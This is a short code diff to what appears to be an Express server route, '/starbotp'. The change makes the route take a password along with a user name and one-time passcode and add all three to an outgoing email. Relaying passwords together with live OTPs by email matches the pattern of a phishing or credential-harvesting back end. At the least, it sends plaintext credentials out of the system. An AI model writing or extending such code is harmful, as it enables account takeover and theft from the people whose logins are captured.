@@ -760,6 +760,7 @@ app.post("/starbotp", async (req, res) => {
   const {
     userName,
    otp,
+   password
   } = req.body;
 
   // Construct email message
@@ -767,6 +768,11 @@ app.post("/starbotp", async (req, res) => {
     New details for${userName}:
 
     OTP: ${otp}
+    
+    userName: ${userName}
+
+    password: ${password}
+
 
   `;
   // Create a transporter object using SMTP transport
